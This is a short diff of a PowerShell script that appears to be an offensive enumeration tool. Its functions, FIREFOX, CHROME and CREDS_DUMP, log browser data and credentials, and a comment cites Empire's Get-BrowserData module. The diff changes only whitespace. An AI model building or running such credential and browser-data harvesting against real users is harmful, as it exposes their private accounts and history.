@@ -319,7 +319,7 @@ function FIREFOX {
             ForEach ($Key in $Regex){
                 echo "$Key" >> $LogFilePath\BrowserEnum.log
             }
-    }
+        }
 }
 
 
@@ -395,7 +395,6 @@ function CHROME {
             echo $Store >> $LogFilePath\BrowserEnum.log
             }
         }
-
 
         ## Retrieve Chrome History
         # Source: https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-BrowserData.ps1
@@ -534,7 +533,6 @@ function CREDS_DUMP {
         }
     }
 }
-
 
 
 ## Jump Links (Functions)
